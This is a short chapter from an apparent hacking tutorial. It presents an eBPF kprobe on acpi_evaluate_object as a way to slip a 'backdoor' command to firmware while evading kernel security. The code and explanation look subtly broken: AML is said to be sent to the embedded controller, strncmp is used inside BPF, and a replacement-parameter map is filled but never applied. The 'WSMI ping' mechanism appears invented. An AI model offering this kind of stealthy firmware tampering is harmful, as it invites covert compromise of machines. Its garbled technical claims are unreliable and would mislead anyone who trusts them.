Chapter 17: Awakening the Hardware

I always thought firmware was this unreachable fortress, guarded by the kernel’s highest privileges. But what if you could eBPF a backdoor straight into the BIOS hotline? Welcome to the ACPI WSMI ping—where your BPF program taps the kernel’s ACPI driver and whispers commands directly to the firmware.

You’ll hook into acpi_evaluate_object() right before it sends AML code to the EC, swap in your custom method and parameters, then let it fly under the radar of every security guard in the kernel.

SEC("kprobe/acpi_evaluate_object")
int hijack_acpi(struct pt_regs *ctx) {
    const char target[] = "\\_SB._WS0.Ping";
    char path[MAX_ACPI_PATH_LEN];
    bpf_probe_read_str(path, sizeof(path), (void *)PT_REGS_PARM1(ctx));
    if (strncmp(path, target, sizeof(target)-1) == 0) {
        struct acpi_param param = {};
        param.type = ACPI_TYPE_INTEGER;
        param.data[0] = 0xdeadbeef;
        param.data_len = sizeof(u64);
        bpf_map_update_elem(&replacement_params, target, &param, BPF_ANY);
    }
    return 0;
}
